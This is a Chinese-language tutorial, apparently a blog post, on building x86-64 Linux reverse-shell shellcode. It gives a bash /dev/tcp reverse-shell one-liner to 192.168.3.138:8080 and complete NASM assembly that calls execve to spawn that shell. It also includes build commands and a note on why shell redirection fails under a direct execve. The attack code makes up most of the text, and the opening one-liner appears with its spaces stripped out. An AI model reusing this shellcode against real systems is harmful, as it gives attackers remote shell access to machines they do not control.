## 命令行下

*   反弹命令 `bash-i>&/dev/tcp/192.168.3.138/80800>&1`
    

## 系统调用

我们依然是通过syscall的方法来调用系统api，man一下syscall

![](../Images/4368c61dc9d5fcd1d9130e0caf2c5572.png)

![](../Images/15c85bef0ffc442f05b40ba28b3605c1.png)

通过查表我们可以确定，这次调用不是通过int 0x80而是直接调用syscall来进行。同时参数寄存器也是改为了rdi,rsi,rdx,r10,r8,r9。  

### execve

通过查询unistd\_64.h可以确定execve 的调用号为59，即0x3b。参数列表为 `['/bin/bash','-c','/bin/bash -i >& /dev/tcp/192.168.3.138/8080 0>&1']`参数转16进制的方法python3下 `'string'[::-1].encode().hex()`

![](../Images/0060cb5b23883b1028dbb8bab71dd84e.png)

## 贴代码

```
1.  `section .text  ; defines code section`
    
2.  
    
3.  `global _start`
    
4.  
    
5.  `_start:             `
    
6.  
    
7.  `  xor rdx, rdx`
    
8.  `  xor rax, rax`
    
9.  
    
10.  `  push rdx          ; 字符串结尾的00`
     
11.  `  push 0x68`
     
12.  `  mov rax,0x7361622f6e69622f  ; '/bin/bash'`
     
13.  `  push rax`
     
14.  `  mov rdi, rsp      ;  '/bin/bash' 字符串起始地址存入rdi`
     
15.  
     
16.  `  push rdx         ; 字符串结尾的00'`
     
17.  `  xor rax,rax`
     
18.  `  mov ax, 0x632d`
     
19.  `  push rax          ; '-c'`
     
20.  `  mov r10, rsp      ;  '-c' 字符串起始地址存入r10`
     
21.  
     
22.  `  push rdx          ; 字符串结尾的00`
     
23.  `  mov rax, 0x31263e3020303830`
     
24.  `  push  rax         ; 080 0>&1`
     
25.  `  mov rax, 0x382f3833312e332e`
     
26.  `  push rax          ;.3.138/8`
     
27.  `  mov rax, 0x3836312e3239312f`
     
28.  `  push rax          ;/192.168`
     
29.  `  mov rax, 0x7063742f7665642f`
     
30.  `  push rax          ;/dev/tcp`
     
31.  `  mov rax, 0x20263e20692d2068`
     
32.  `  push rax          ;h -i >&`
     
33.  `  mov rax, 0x7361622f6e69622f`
     
34.  `  push rax          ;/bin/bas`
     
35.  `  mov rcx, rsp      ;  '/bin/bash -i >& /dev/tcp/192.168.3.138/8080 0>&1' 字符串起始地址存入rcx`
     
36.  
     
37.  `  push rdx  ; 数组结尾的00`
     
38.  `  push rcx  ;  '/bin/bash -i >& /dev/tcp/192.168.3.138/8080 0>&1' 地址的指针压栈`
     
39.  `  push r10  ;  '-c' 地址的指针压栈`
     
40.  `  push rdi  ; '/bin/bash' 地址的指针压栈`
     
41.  `  mov rsi, rsp ; ['/bin/bash', '-c','/bin/bash -i >& /dev/tcp/192.168.3.138/8080 0>&1'] 参数列表的指针（即第一个参数的地址）存入rsi`
     
42.  
     
43.  `  push 0x3b  ; execve 的syscall`
     
44.  `  pop rax    ; 把调用号存入rax`
     
45.  `  syscall    ; call execve('/bin/bash', ['/bin/bash', '-c','/bin/bash -i >& /dev/tcp/192.168.3.138/8080 0>&1'], 0)`
     
```

## 编译

1.  `nasm-f elf64 a.asm`
    
2.  `ld a.o`

## 坑点

`>&`等重定向符号是由shell本身来解释的，不属于shell的参数，因此直接使用execve调用 `/bin/bash-i>&/dev/tcp/192.168.3.138/80800>&1`会出现 `>&:Nosuch fileordirectory`的问题。

